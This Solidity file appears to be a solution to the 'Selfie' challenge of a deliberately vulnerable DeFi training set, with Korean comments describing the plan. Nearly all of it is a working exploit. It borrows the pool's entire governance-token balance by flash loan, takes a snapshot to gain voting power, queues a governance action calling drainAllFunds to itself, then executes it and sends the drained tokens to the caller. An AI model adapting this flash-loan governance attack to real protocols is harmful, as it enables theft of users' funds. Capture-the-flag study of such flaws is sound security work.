// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";



contract SelfieExploit { 


    //DamnValuableTokenSnapshot == ERC20Snapshot
    SimpleGovernance public simpleGovernance;
    SelfiePool public selfiePool;
    DamnValuableTokenSnapshot public DVT;

    address public owner ; 
    uint256 public actionId;

    constructor(address _simpleGovernance, address _selfiePool, address _tokenAddress){
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
        DVT = DamnValuableTokenSnapshot(_tokenAddress);
        owner = msg.sender;
    }

    /**
    지금상태 : pool에 150만 DamnValuableTokenSnapshot 토큰이 있음. 

    SimpleGovernance컨트랙트안에 queueAction함수를 통해서 어떤 행동을 할지 설정을하고 executeAction을 통해서 실행시키면 SelfiePool컨트랙트의 drainAllFunds함수가 작동하게 하면 되는것이다.

    flashLoan함수도 이용해야함 .
     */

    function attack( ) external {
         selfiePool.flashLoan(DVT.balanceOf(address(selfiePool)));
     }

    //receiveTokens 함수의 인터페이스는 고정. 
    function receiveTokens(address _token, uint256 _borrowAmount) external{
        //receiveTokens는 150만 DVT를 가지고 뭘 해야함. 
        DVT.approve(address(simpleGovernance), type(uint256).max);
        DVT.snapshot();
        DVT.transfer(address(selfiePool), _borrowAmount); 
        // 다시 selfiePool에 150만개 보낸다.
        // receiver = 컨트랙트여야함. 
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(this)
            );
        //qeeueAction을 통해서 drainAllFunds 실행 
         actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
         // 여기에 2일의 시간을 지나게해야한다. 

     }

     function attack2() external {
         simpleGovernance.executeAction(actionId);
         DVT.transfer(msg.sender, DVT.balanceOf(address(this)));
     }
}